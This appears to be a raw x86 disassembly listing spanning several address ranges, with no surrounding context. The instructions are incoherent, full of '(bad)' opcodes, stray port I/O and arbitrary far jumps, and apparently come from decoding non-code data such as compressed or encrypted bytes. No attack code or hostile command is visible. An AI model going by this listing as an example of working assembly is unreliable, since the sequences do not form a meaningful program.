  4241c0:	call   0xd986:0xd7d538f0
  4241c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241c8:	xchg   edi,esi
  4241ca:	pop    ebx
  4241cb:	cmp    BYTE PTR [ecx+0x63cc63ab],bl
  4241d1:	dec    esi
  4241d2:	xchg   esp,eax
  4241d3:	jmp    0x15e7ee3a
  4241d8:	in     eax,dx
  4241d9:	idiv   DWORD PTR [ebp+0x8]
  4241dc:	pop    edi
  4241dd:	mov    ebx,DWORD PTR [edx+0x2]
  4241e0:	xchg   edi,eax
  4241e1:	and    al,0xb3
  4241e3:	jo     0x424235
  4241e5:	test   eax,0x8be9fa1
  4241ea:	out    dx,al
  4241eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4241ec:	sub    dl,BYTE PTR [ecx]
  4241ee:	scas   al,BYTE PTR es:[edi]
  4241ef:	push   si
  4241f1:	xchg   BYTE PTR [ebx],ah
  4241f3:	xchg   BYTE PTR [ebx+ecx*8+0x8],bl
  4241f7:	xchg   DWORD PTR [ecx-0x7e63cb0],ebp
  4241fd:	in     eax,0x93
  4241ff:	out    dx,al
  424200:	jecxz  0x42427a
  424202:	jge    0x42423b
  424204:	mov    esi,0x8d2133cb
  424209:	push   es
  42420a:	jo     0x424213
  42420c:	jo     0x4241de
  42420e:	push   ecx
  42420f:	jmp    0x42419f
	...
  424271:	add    BYTE PTR [eax],al
  424273:	add    BYTE PTR [edi-0x4c275c4c],al
  424279:	(bad)  
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	mov    al,ds:0x3dc62c5d
  424285:	add    BYTE PTR [ecx],0x0
  424288:	add    eax,0x40000001
  42428d:	xor    BYTE PTR [edi+0x6981ed30],0x2e
  424294:	mov    dl,BYTE PTR [eax+0x56b3fd61]
  42429a:	mov    DWORD PTR [ecx],ebx
  42429c:	xchg   DWORD PTR [edi-0x25bd8c4],edi
  4242a2:	loop   0x42429c
  4242a4:	ins    DWORD PTR es:[edi],dx
  4242a5:	mov    bh,0xe9
  4242a7:	mov    gs,WORD PTR [esi]
  4242a9:	and    edi,ebp
  4242ab:	cmp    BYTE PTR [ecx+0x657326f2],dl
  4242b1:	int3   
  4242b2:	add    al,0x44
  4242b4:	sbb    dl,dl
  4242b6:	frstor [edx+0x35]
  4242b9:	mov    al,0x9c
  4242bb:	push   ds
  4242bc:	fild   DWORD PTR [edx+0x405d6676]
  4242c2:	add    esi,esi
  4242c4:	fdivr  QWORD PTR [edx+0x41]
  4242c7:	ins    DWORD PTR es:[edi],dx
  4242c8:	inc    esp
  4242c9:	mov    BYTE PTR [ecx+0x26df5059],ch
  4242cf:	pmulhuw mm4,QWORD PTR [edi-0x2e]
  4242d3:	outs   dx,DWORD PTR ds:[esi]
  4242d4:	je     0x424264
  4242d6:	adc    eax,0xc595ac0b
  4242db:	sti    
  4242dc:	xor    eax,0x1f1c09d2
  4242e1:	pop    esi
  4242e2:	fidivr DWORD PTR [eax]
  4242e4:	sbb    al,0xdc
  4242e6:	fnstsw WORD PTR [edx]
  4242e8:	les    esp,FWORD PTR [edx*1+0x3407da82]
  4242ef:	mov    bl,0x7d
  4242f1:	jnp    0x42435d
  4242f3:	fistp  QWORD PTR [edi-0x6]
  4242f6:	lahf   
  4242f7:	xchg   edi,eax
  4242f8:	leave  
  4242f9:	mov    bh,0x78
  4242fb:	pusha  
  4242fc:	out    dx,al
  4242fd:	push   es
  4242fe:	sbb    al,0x7a
  424300:	adc    al,0xc5
  424302:	adc    al,0x38
  424304:	loope  0x4242e6
  424306:	fstp   TBYTE PTR [edx]
  424308:	out    dx,al
  424309:	add    edx,DWORD PTR [esi]
  42430b:	lods   eax,DWORD PTR ds:[esi]
  42430c:	ds inc ecx
  42430e:	and    al,BYTE PTR [edi+0x1]
  424311:	aad    0x24
  424313:	stos   BYTE PTR es:[edi],al
  424314:	pop    es
  424315:	add    ch,BYTE PTR [ebx+0x78330ba3]
  42431b:	mov    esp,eax
  42431d:	add    edi,DWORD PTR [ecx-0x53b9dc78]
  424323:	inc    edx
  424324:	dec    ecx
  424325:	push   esp
  424326:	stc    
  424327:	(bad)  
  424329:	sub    dh,dl
  42432b:	inc    esi
  42432c:	push   cs
  42432d:	aaa    
  42432e:	leave  
  42432f:	fs xchg ecx,eax
  424331:	pushf  
  424332:	push   eax
  424333:	aas    
  424334:	push   eax
  424335:	inc    eax
  424336:	push   cs
  424337:	inc    esp
  424338:	es cs lock dec edx
  42433c:	cld    
  42433d:	mov    DWORD PTR [ecx],esi
  42433f:	or     al,0xbc
  424341:	cli    
  424342:	mov    al,ds:0xf1a5a85
  424347:	sbb    al,0x7e
  424349:	fdivr  QWORD PTR [esi+eiz*4+0x13]
  42434d:	add    DWORD PTR [edx+0x3825db62],edi
  424353:	mov    ebp,0xa468d58
  424358:	fxtract 
  42435a:	and    eax,0x9558e8ad
  42435f:	sub    al,0x39
  424361:	dec    eax
  424362:	jmp    0x6e3:0xb6078bf8
  424369:	mov    cl,0x3b
  42436b:	addr16 mov eax,ds:0xef03
  42436f:	out    0x7f,al
  424371:	sub    dh,BYTE PTR [eax+0x45cb7604]
  424377:	lods   eax,DWORD PTR ds:[esi]
  424378:	and    BYTE PTR ds:0x34220d1c,bl
  42437e:	cli    
  42437f:	jns    0x4243ce
  424381:	lea    edx,[ebp-0x39496367]
  424387:	in     eax,0xb5
  424389:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42438a:	pop    ss
  42438b:	jge    0x42436f
  42438d:	jge    0x424373
  42438f:	in     eax,0x26
	...
  4243f1:	add    BYTE PTR [eax],al
  4243f3:	add    BYTE PTR [edx-0x24582da],cl
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x4243cf
  424401:	dec    esi
  424402:	sub    ecx,ecx
  424404:	inc    edx
  424405:	add    DWORD PTR [ecx],0x0
  424408:	add    eax,0x67000001
  42440d:	mov    dh,0xe
  42440f:	dec    edi
  424410:	stos   BYTE PTR es:[edi],al
  424411:	push   0x3
  424413:	je     0x424411
  424415:	cmp    BYTE PTR [ecx-0x41],ch
  424418:	push   es
  424419:	popa   
  42441a:	xor    BYTE PTR gs:0x84ce0182,ch
  424421:	test   esi,ebx
  424423:	xchg   esi,eax
  424424:	and    al,0x20
  424426:	push   0xb229cd99
  42442b:	fld    QWORD PTR [eax+esi*1]
  42442e:	xchg   ebx,eax
  42442f:	push   0xffffffb8
  424431:	mov    WORD PTR [edx+0x10],fs
  424434:	js     0x4243dd
  424436:	in     eax,dx
  424437:	push   esp
  424438:	sbb    DWORD PTR [edx-0x38],edx
  42443b:	push   es
  42443c:	mov    al,0xb2
  42443e:	adc    BYTE PTR [eax+0x655bfff2],ah
  424444:	jle    0x4243fe
  424446:	outs   dx,BYTE PTR ds:[esi]
  424447:	and    al,BYTE PTR [edx+0x28c508a0]
  42444d:	ins    BYTE PTR es:[edi],dx
  42444e:	sub    eax,0x33ff7f1a
  424453:	loopne 0x4243e0
  424455:	xchg   BYTE PTR [ebx],al
  424457:	add    al,0xaf
  424459:	ds daa 
  42445b:	aam    0xb8
  42445d:	pop    ebp
  42445e:	cmp    BYTE PTR [edx+ebp*4+0x13],bh
  424462:	jno    0x4244a9
  424464:	cs inc ebp
  424466:	shl    BYTE PTR [ecx-0x4f],1
  424469:	jb     0x424488
  42446b:	mov    ebp,DWORD PTR [esi]
  42446d:	lods   eax,DWORD PTR ds:[esi]
  42446e:	inc    ebx
  42446f:	aas    
  424470:	std    
  424471:	loope  0x4243f7
  424473:	xchg   DWORD PTR [ebx],ebp
  424475:	popf   
  424476:	pop    esp
  424477:	adc    BYTE PTR [ebp+0x6c],ch
  42447a:	hlt    
  42447b:	pop    ebp
  42447c:	daa    
  42447d:	and    edx,DWORD PTR [ebx-0x39cb870]
  424483:	mov    al,BYTE PTR [edi+0x2a]
  424486:	and    DWORD PTR [ebx-0x3a7c8469],ecx
  42448c:	repz mov bl,0xba
  42448f:	loop   0x42443f
  424491:	cmp    edx,DWORD PTR [edx-0x6b55d3a2]
  424497:	out    dx,al
  424498:	push   ebx
  424499:	xchg   ebx,eax
  42449a:	jp     0x42441c
  42449c:	outs   dx,BYTE PTR ds:[esi]
  42449d:	dec    ebp
  42449e:	out    0x92,eax
  4244a0:	(bad)  
  4244a1:	jl     0x424480
  4244a3:	xchg   edx,eax
  4244a4:	push   es
  4244a5:	dec    edx
  4244a6:	retf   0x2f95
  4244a9:	sub    DWORD PTR [ebp+0x46e67e7c],ebp
  4244af:	outs   dx,DWORD PTR ds:[esi]
  4244b0:	addr16 stc 
  4244b2:	jl     0x424449
  4244b4:	dec    edi
  4244b5:	sub    BYTE PTR [ecx-0x1b],ah
  4244b8:	aam    0xc1
  4244ba:	dec    eax
  4244bb:	ins    DWORD PTR es:[edi],dx
  4244bc:	cs inc ebp
  4244be:	add    cl,bl
  4244c0:	sar    BYTE PTR [ebx+ebx*8+0x15],1
  4244c4:	imul   DWORD PTR [eax]
  4244c6:	jns    0x424538
  4244c8:	mov    eax,0xbd7e550d
  4244cd:	cmp    eax,0xcfdb470f
  4244d2:	dec    eax
  4244d3:	add    BYTE PTR [edx],0x8a
  4244d6:	stos   DWORD PTR es:[edi],eax
  4244d7:	lods   al,BYTE PTR ds:[esi]
  4244d8:	push   ds
  4244d9:	das    
  4244da:	mov    ch,0x71
  4244dc:	clc    
  4244dd:	mov    BYTE PTR cs:[edi],bh
  4244e0:	ds push ds
  4244e2:	and    esp,ebp
  4244e4:	ins    BYTE PTR es:[edi],dx
  4244e5:	scas   al,BYTE PTR es:[edi]
  4244e6:	inc    ebx
  4244e7:	aam    0x20
  4244e9:	and    ebp,DWORD PTR [edx+0x15]
  4244ec:	sub    cl,BYTE PTR [ebp+0x27]
  4244ef:	pop    esp
  4244f0:	pop    edx
  4244f1:	push   ds
  4244f2:	push   edi
  4244f3:	xor    DWORD PTR ds:0x8387d9f1,0xa2f639b5
  4244fd:	cmp    BYTE PTR [esi+0x4f458164],bl
  424503:	in     eax,0x2a
  424505:	inc    esi
  424506:	cmp    eax,0x627c49a2
  42450b:	push   ecx
  42450c:	sub    eax,0x47e65011
	...
  424571:	add    BYTE PTR [eax],al
  424573:	add    al,ah
  424575:	outs   dx,DWORD PTR ds:[esi]
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4-0x43],1
  424581:	and    al,0x40
  424583:	dec    esi
  424584:	inc    edi
  424585:	test   BYTE PTR [ecx],al
  424587:	add    BYTE PTR ds:0xb0000001,al
  42458d:	jbe    0x424574
  42458f:	and    DWORD PTR [ebp-0x64],esp
  424592:	xchg   edx,eax
  424593:	nop
  424594:	clc    
  424595:	dec    edi
  424596:	push   ecx
  424597:	lock add DWORD PTR [edi+0x4e99ddc7],ebp
  42459e:	push   DWORD PTR [edi+0x49100df1]
  4245a4:	cli    
  4245a5:	retf   0x73c6
  4245a8:	jl     0x4245e9
  4245aa:	pop    es
  4245ab:	inc    ebp
  4245ac:	xchg   esi,eax
  4245ad:	lock rcl DWORD PTR [edi+0x203eb2fe],cl
  4245b4:	cmp    esi,edx
  4245b6:	sub    al,BYTE PTR [ebx-0x4f0069ab]
  4245bc:	adc    eax,0x969ea34c
  4245c1:	jmp    0x44db:0x6b580154
  4245c8:	pop    edx
  4245c9:	cwde   
  4245ca:	and    esp,edx
  4245cc:	xchg   esi,eax
  4245cd:	data16 xor al,0x73
  4245d0:	sbb    al,0x0
  4245d2:	in     al,dx
  4245d3:	mov    bh,dl
  4245d5:	mov    dl,0x3c
  4245d7:	or     BYTE PTR [edi-0x22],dh
  4245da:	inc    ebx
  4245db:	inc    ecx
  4245dc:	gs in  al,dx
  4245de:	jns    0x4245ef
  4245e0:	dec    eax
  4245e1:	das    
  4245e2:	ins    DWORD PTR es:[edi],dx
  4245e3:	mov    ch,0x37
  4245e5:	inc    eax
  4245e6:	jns    0x4245de
  4245e8:	add    ecx,DWORD PTR [ebx+0x3a]
  4245eb:	(bad)  
  4245ec:	hlt    
  4245ed:	pop    esp
  4245ee:	cld    
  4245ef:	ins    DWORD PTR es:[edi],dx
  4245f0:	daa    
  4245f1:	int    0x2f
  4245f3:	or     DWORD PTR [esi+ebx*2],esp
  4245f6:	pusha  
  4245f7:	and    ebp,DWORD PTR [ecx]
  4245f9:	mov    BYTE PTR [ebp-0x2e],bl
  4245fc:	enter  0x3b0a,0x5c
  424600:	inc    eax
  424601:	and    eax,0x801cad49
  424606:	push   ebx
  424607:	fild   WORD PTR [esi+edx*8+0x2f]
  42460b:	xchg   edi,eax
  42460c:	(bad)  
  42460d:	retf   
  42460e:	xor    DWORD PTR [eax-0x49],eax
  424611:	shl    edx,0x1a
  424614:	rcr    DWORD PTR [ebx+0x77],0x7f
  424618:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424619:	outs   dx,DWORD PTR ds:[esi]
  42461a:	and    cl,BYTE PTR [edx-0x27]
  42461d:	dec    ebx
  42461e:	pop    edx
  42461f:	int    0xfb
  424621:	imul   ebx,DWORD PTR [esi-0x70ae9b3c],0x41
  424628:	sbb    BYTE PTR [esi+ebx*4+0x12b7d029],cl
  42462f:	sub    DWORD PTR ds:[ecx-0x157c4ce4],esp
  424636:	and    BYTE PTR [ebx+0x3f78a89f],bh
  42463c:	mov    ch,0xe5
  42463e:	mov    ch,0x2
  424640:	aaa    
  424641:	out    dx,al
  424642:	inc    ebp
  424643:	ja     0x424686
  424645:	pushf  
  424646:	imul   edx,DWORD PTR [edx-0x1fdaa7b7],0xffffff8d
  42464d:	cmp    esp,DWORD PTR [ecx-0x1]
  424650:	aas    
  424651:	xor    BYTE PTR ds:0xb6af935e,dh
  424657:	sub    BYTE PTR [edi],al
  424659:	cmp    al,0xe
  42465b:	addr16 retf 0x7c80
  42465f:	sbb    eax,0x3a96aa94
  424664:	lahf   
  424665:	mov    dl,dl
  424667:	sbb    BYTE PTR [ebp-0x2e],0xc3
  42466b:	adc    al,0x5f
  42466d:	rcr    dl,1
  42466f:	pushf  
  424670:	xchg   ebx,eax
  424671:	xchg   esp,eax
  424672:	cs out dx,al
  424674:	lods   al,BYTE PTR ds:[esi]
  424675:	mov    eax,DWORD PTR [eax-0x1a65839a]
  42467b:	stos   DWORD PTR es:[edi],eax
  42467c:	(bad)  
  42467d:	popa   
  42467e:	arpl   WORD PTR [ebp+0x16],sp
  424681:	cld    
  424682:	in     eax,dx
  424683:	jbe    0x42465b
  424685:	sbb    cl,BYTE PTR [edi+0x681d2a2d]
  42468b:	sahf   
  42468c:	gs (bad) 
  42468e:	push   0xf6cc
	...
  4246f3:	add    BYTE PTR [edx+edx*4-0x10004],bh
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    BYTE PTR [eax+0x4c],dl
  424702:	mov    al,ds:0x1854c77
  424707:	add    BYTE PTR ds:0x22000001,al
  42470d:	ja     0x4246e8
  42470f:	xchg   BYTE PTR [ebx],cl
  424711:	jb     0x4246fd
  424713:	nop
  424714:	jmp    0x42478d
  424716:	out    dx,al
  424717:	dec    edi
  424718:	call   0x4bdf:0x16b16c12
  42471f:	mov    ds:0xfbdf3a1f,al
  424724:	sbb    cl,BYTE PTR [ebx-0x23]
  424727:	jns    0x42477d
  424729:	mov    ch,0xd7
  42472b:	(bad)  
  42472c:	jb     0x4246c8
  42472e:	or     al,0xbc
  424730:	adc    al,0x3
  424732:	pop    esp
  424733:	das    
  424734:	dec    esp
  424735:	loope  0x424741
  424737:	stos   DWORD PTR es:[edi],eax
  424738:	add    dh,al
  42473a:	jecxz  0x42471f
  42473c:	xchg   bl,bl
  42473e:	mov    WORD PTR [ebp-0x798c26aa],cs
  424744:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424745:	sub    DWORD PTR [eax],0x7402ab4c
  42474b:	iret   
  42474c:	mov    WORD PTR [ecx+0x529586c3],ds
  424752:	jae    0x4246e2
  424754:	lods   al,BYTE PTR ds:[esi]
  424755:	or     edi,DWORD PTR [eax]
  424757:	push   esi
  424758:	add    DWORD PTR [ebx],edi
  42475a:	sbb    dh,cl
  42475c:	dec    esi
  42475d:	lds    ebx,FWORD PTR [ecx+0x6cfe350b]
  424763:	out    0x8d,al
  424765:	popa   
  424766:	jb     0x4246f9
  424768:	mov    al,0x24
  42476a:	daa    
  42476b:	xchg   esp,eax
  42476c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42476d:	arpl   WORD PTR [ebp+0x22],si
  424770:	sbb    bl,ch
  424772:	push   ebp
  424773:	test   DWORD PTR [ebp-0x5b0319b1],0x189180e8
  42477d:	loopne 0x42472d
  42477f:	sti    
  424780:	jnp    0x424744
  424782:	jmp    0xb00f4745
  424787:	bnd jb 0x4247e3
  42478a:	test   eax,0xe8e4b195
  42478f:	and    al,0x2f
  424791:	lahf   
  424792:	enter  0xdf0c,0x8f
  424796:	fs clc 
  424798:	ss xchg ebx,eax
  42479a:	cli    
  42479b:	arpl   WORD PTR [eax+0x2ecb5d5d],dx
  4247a1:	sbb    dh,BYTE PTR [edi-0x41]
  4247a4:	das    
  4247a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4247a6:	adc    DWORD PTR [ecx],edx
  4247a8:	cdq    
  4247a9:	and    al,0x62
  4247ab:	fist   DWORD PTR [ebx]
  4247ad:	leave  
  4247ae:	je     0x4247f3
  4247b0:	int    0x89
  4247b2:	nop
  4247b3:	sbb    al,0x20
  4247b5:	xor    DWORD PTR [edx],edi
  4247b7:	jnp    0x424815
  4247b9:	pushf  
  4247ba:	shl    BYTE PTR [ebx+0x72],0xdb
  4247be:	daa    
  4247bf:	ror    ebp,cl
  4247c1:	(bad)  
  4247c2:	and    al,cl
  4247c4:	fwait
  4247c5:	clc    
  4247c6:	les    ecx,FWORD PTR [edi+ebp*1+0x22]
  4247ca:	test   DWORD PTR [ebx+0x3ee6bd65],edx
  4247d0:	pop    ebx
  4247d1:	dec    edx
  4247d2:	or     al,0xc0
  4247d4:	repz jp 0x424844
  4247d7:	lahf   
  4247d8:	mov    bl,0x47
  4247da:	push   ds
  4247db:	pop    esi
  4247dc:	jo     0x4247b4
  4247de:	cmpxchg BYTE PTR [edx+0x65d2fdea],dl
  4247e5:	fidivr DWORD PTR [edi]
  4247e7:	sub    ecx,esp
  4247e9:	xchg   esi,eax
  4247ea:	imul   esi,DWORD PTR [eax+0xc],0xffffffa5
  4247ee:	iret   
  4247ef:	pop    ecx
  4247f0:	mov    DWORD PTR [ebx+0x2f03e563],0x7b9ac7b8
  4247fa:	stos   BYTE PTR es:[edi],al
  4247fb:	clc    
  4247fc:	cli    
  4247fd:	in     al,dx
  4247fe:	push   ds
  4247ff:	(bad)  
  424800:	std    
  424801:	mov    WORD PTR [ebp+0xb6860ea],es
  424807:	scas   al,BYTE PTR es:[edi]
  424808:	xchg   edi,eax
  424809:	xor    cl,BYTE PTR [esp+edi*2-0xe]
  42480d:	in     eax,0x6d
  42480f:	sub    DWORD PTR [edi+0x0],ebx
	...
  424871:	add    BYTE PTR [eax],al
  424873:	add    BYTE PTR [edx],ah
  424875:	pop    eax
  424876:	test   bh,ch
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	push   esp
  424881:	cli    
  424882:	inc    esi
  424883:	mov    ah,0x51
  424885:	xchg   BYTE PTR [ecx],al
  424887:	add    BYTE PTR ds:0x1e000001,al
  42488d:	leave  
  42488e:	fmul   st,st(4)
  424890:	ficom  WORD PTR [edi]
  424892:	add    eax,0xf1265472
  424897:	out    0x2d,eax
  424899:	push   ds
  42489a:	enter  0xe0a4,0x56
  42489e:	lods   eax,DWORD PTR ds:[esi]
  42489f:	pop    ebp
  4248a0:	out    dx,eax
  4248a1:	sbb    cl,bl
  4248a3:	xchg   ecx,eax
  4248a4:	mov    ebp,0x49f50d83
  4248a9:	sbb    esi,DWORD PTR [edx-0x33d63e93]
  4248af:	and    al,0xf7
  4248b1:	cli    
  4248b2:	dec    ebx
  4248b3:	sbb    al,BYTE PTR [edx]
  4248b5:	or     esi,ebx
  4248b7:	retf   
  4248b8:	adc    al,0xe0
  4248ba:	(bad)  
  4248bb:	loope  0x424928
  4248bd:	xchg   esi,eax
  4248be:	sbb    BYTE PTR [ebx+0x3a],0x1f
  4248c2:	into   
  4248c3:	push   ecx
  4248c4:	lahf   
  4248c5:	xchg   DWORD PTR [edx-0x2d7004a6],edi
  4248cb:	xchg   ecx,eax
  4248cc:	(bad)  
  4248cd:	ds sub ecx,edx
  4248d0:	mov    dh,0x51
  4248d2:	test   edi,edx
  4248d4:	cs push es
  4248d6:	mov    cl,BYTE PTR [edi+0x15]
  4248d9:	dec    eax
  4248da:	pop    edx
  4248db:	fmul   DWORD PTR [ebx-0x292385f3]
  4248e1:	jnp    0x4248d0
  4248e3:	mov    esi,0xd63b0d01
  4248e8:	je     0x42488b
  4248ea:	sub    ch,BYTE PTR [ebx-0x70f603e9]
  4248f0:	sub    ebp,edi
  4248f2:	inc    edx
  4248f3:	adc    DWORD PTR cs:[ebx+0x330897fc],ebp
  4248fa:	cmp    ch,BYTE PTR [eax]
  4248fc:	and    ebp,DWORD PTR [bx+di+0x5c3c]
  424901:	out    0x10,eax
  424903:	adc    eax,0xc4d032a7
  424908:	sahf   
  424909:	dec    ebx
  42490a:	mov    al,0xed
  42490c:	mov    esp,0xfbb33393
  424911:	mov    eax,0xce9e4caf
  424916:	xchg   esp,eax
  424917:	and    ecx,DWORD PTR [ebx-0x4e818467]
  42491d:	jns    0x4248da
  42491f:	les    ecx,FWORD PTR [ebx]
  424921:	hlt    
  424922:	xor    ecx,DWORD PTR [ecx-0xb]
  424925:	sbb    dl,bh
  424927:	cwde   
  424928:	cli    
  424929:	call   0x3176:0x19279bf8
  424930:	dec    ebx
  424931:	fwait
  424932:	xchg   ebx,eax
  424933:	icebp  
  424934:	cmp    DWORD PTR es:[esi-0x7c],edi
  424938:	sbb    dh,ch
  42493a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42493b:	dec    ebx
  42493c:	dec    esi
  42493d:	adc    esi,esp
  42493f:	cmp    DWORD PTR [ecx],ecx
  424941:	fwait
  424942:	xchg   edx,eax
  424943:	loopne 0x4248d3
  424945:	scas   al,BYTE PTR es:[edi]
  424946:	ss jle 0x424950
  424949:	dec    ebp
  42494a:	add    DWORD PTR [ecx],esi
  42494c:	(bad)  
  42494e:	ror    bl,1
  424950:	les    ebx,FWORD PTR [edx-0x61]
  424953:	std    
  424954:	mov    ?,WORD PTR [eax]
  424956:	push   ss
  424957:	imul   ebx,ecx,0xffffffb1
  42495a:	icebp  
  42495b:	imul   DWORD PTR [esi+0x374f61e0]
  424961:	mov    ch,al
  424963:	aaa    
  424964:	xor    bl,bl
  424966:	fstp   DWORD PTR ds:0xef1af9a1
  42496c:	dec    esi
  42496d:	xchg   ebp,eax
  42496e:	adc    edx,DWORD PTR [edx+0x75]
  424971:	push   0x4c
  424973:	add    dl,BYTE PTR [ecx+0x593a0308]
  424979:	cmp    DWORD PTR [ebp+0x2289395c],edi
  42497f:	push   es
  424980:	inc    edx
  424981:	cmp    eax,0x5bda3197
  424986:	(bad)  
  424987:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424988:	shr    DWORD PTR [edx],1
  42498a:	pop    ds
  42498b:	jg     0x4249d0
  42498d:	inc    esi
  42498e:	dec    edx
  42498f:	cmp    al,BYTE PTR [ecx+0x0]
	...
  4249f1:	add    BYTE PTR [eax],al
  4249f3:	add    BYTE PTR [ebx+0x18],ch
  4249f6:	arpl   WORD PTR [edx+0x73],bp
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    bh,ch
  424a01:	inc    eax
  424a02:	xchg   edi,eax
  424a03:	hlt    
  424a04:	push   esi
  424a05:	xchg   DWORD PTR [ecx],eax
  424a07:	add    BYTE PTR ds:0x4e000001,al
  424a0d:	call   0x9e6e670
  424a12:	repz sbb ecx,ebp
  424a15:	jge    0x4249e9
  424a17:	xchg   ebx,eax
  424a18:	sub    BYTE PTR [esi+eiz*8+0x39d808e2],0x46
  424a20:	repz repz repnz push cs
  424a24:	stc    
  424a25:	push   esi
  424a26:	scas   al,BYTE PTR es:[edi]
  424a27:	loop   0x424a72
  424a29:	adc    BYTE PTR [edx],bl
  424a2b:	fyl2x  
  424a2d:	and    eax,0xf9851621
  424a32:	iret   
  424a33:	leave  
  424a34:	(bad)  
  424a35:	repnz aas 
  424a37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a38:	imul   esi,edi,0xa47b1f85
  424a3e:	push   0x50
  424a40:	and    DWORD PTR [edx],ebp
  424a42:	cmp    eax,0x20b546e3
  424a47:	lahf   
  424a48:	push   eax
  424a49:	push   0xfffffffa
  424a4b:	sub    eax,DWORD PTR [eax-0x71]
  424a4e:	std    
  424a4f:	addr16 cmp al,0xb5
  424a52:	push   ds
  424a53:	inc    edx
  424a54:	ror    DWORD PTR [ebx+0x3272807d],0x54
  424a5b:	cmc    
  424a5c:	cwde   
  424a5d:	mov    bl,0x3b
  424a5f:	or     DWORD PTR [esp+edi*4-0x1d],ebp
  424a63:	call   0x142ae706
  424a68:	shr    edx,1
  424a6a:	jge    0x424a71
  424a6c:	sbb    eax,0xf3bfadf2
  424a71:	pop    ebp
  424a72:	adc    eax,0x5168ec5
  424a77:	outs   dx,DWORD PTR ds:[esi]
  424a78:	out    0x8b,al
  424a7a:	frstor [ebp+0x1bc3b37c]
  424a80:	data16 jns 0x424a81
  424a83:	cdq    
  424a84:	jge    0x424a94
  424a86:	xor    eax,ebx
  424a88:	pop    es
  424a89:	sbb    BYTE PTR [eax-0xb],0xdb
  424a8d:	cwde   
  424a8e:	xor    eax,ebp
  424a90:	not    BYTE PTR [edi-0x4238b44f]
  424a96:	xchg   ebp,eax
  424a97:	in     eax,dx
  424a98:	es int3 
  424a9a:	pop    edi
  424a9b:	or     eax,0x24b2f781
  424aa0:	mov    edx,0x3e02060c
  424aa5:	js     0x424a5d
  424aa7:	dec    esp
  424aa8:	and    al,0x68
  424aaa:	cmp    BYTE PTR [edx+0x19],dh
  424aad:	pop    es
  424aae:	mov    eax,0xaff387ba
  424ab3:	add    eax,0xf791a9b0
  424ab8:	jge    0x424afb
  424aba:	sbb    DWORD PTR [ebp-0x72],ebp
  424abd:	sub    eax,0x47ab37ac
  424ac2:	pop    ecx
  424ac3:	sbb    BYTE PTR [eax+0x43],0x52
  424ac7:	and    eax,0x7034a6ae
  424acc:	jge    0x424abe
  424ace:	dec    eax
  424acf:	shl    DWORD PTR [ebp-0x12],0xde
  424ad3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ad4:	ins    BYTE PTR es:[edi],dx
  424ad5:	add    al,0xbe
  424ad7:	and    al,0x69
  424ad9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ada:	test   BYTE PTR [esp+edx*4-0x16],al
  424ade:	mov    ebp,0xe236673e
  424ae3:	stc    
  424ae4:	imul   edx,eax,0x6c
  424ae7:	xchg   esi,eax
  424ae8:	test   ecx,esi
  424aea:	(bad)  
  424aeb:	fisubr DWORD PTR [ebp+ebp*4+0x25e1f80]
  424af2:	and    al,0x4c
  424af4:	fdivr  QWORD PTR [edi-0x52ea5a49]
  424afa:	mov    edx,0x569e6906
  424aff:	adc    al,0x56
  424b01:	ins    DWORD PTR es:[edi],dx
  424b02:	mov    cl,0xf
  424b04:	dec    bx
  424b06:	imul   esi,DWORD PTR [ebx],0x8
  424b09:	daa    
  424b0a:	jg     0x424ac7
  424b0c:	ds jl  0x424b34
  424b0f:	adc    eax,0xc1
	...
  424b74:	push   es
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	mov    WORD PTR [ebx],gs
  424b82:	inc    edi
  424b83:	out    dx,eax
  424b84:	pop    ebx
  424b85:	mov    BYTE PTR [ecx],al
  424b87:	add    BYTE PTR ds:0xbb000001,al
  424b8d:	pop    edi
  424b8e:	adc    ecx,DWORD PTR [edx]
  424b90:	out    dx,eax
  424b91:	fidivr WORD PTR [ebx]
  424b93:	jmp    0xa1e16973
  424b98:	jmp    0x424bf6
  424b9a:	bound  edi,QWORD PTR [ebx]
  424b9c:	inc    ebp
  424b9d:	shr    BYTE PTR [eax],cl
  424b9f:	pushf  
  424ba0:	xor    BYTE PTR [esi-0x4694929f],bl
  424ba6:	adc    DWORD PTR [edi+0x1114265b],edi
  424bac:	add    eax,0x16bbe681
  424bb1:	ror    DWORD PTR [eax-0x396453b],0xb7
  424bb8:	pusha  
  424bb9:	retf   0xd7f8
  424bbc:	add    dl,ah
  424bbe:	push   ecx
  424bbf:	(bad)  
  424bc0:	(bad)  
  424bc2:	jmp    0xd393:0x5c4c3e19
  424bc9:	sbb    dl,BYTE PTR ds:0xedf6206a
  424bcf:	mov    ch,0xdc
  424bd1:	mov    cl,0xae
  424bd3:	or     edi,DWORD PTR es:[ebp-0x263bea27]
  424bda:	(bad)  
  424bdb:	sub    bh,bh
  424bdd:	outs   dx,BYTE PTR ds:[esi]
  424bde:	push   edx
  424bdf:	je     0x424b9f
  424be1:	in     eax,dx
  424be2:	dec    ebx
  424be3:	mov    al,0xc9
  424be5:	pop    ecx
  424be6:	out    0x89,al
  424be8:	mov    ch,0x5f
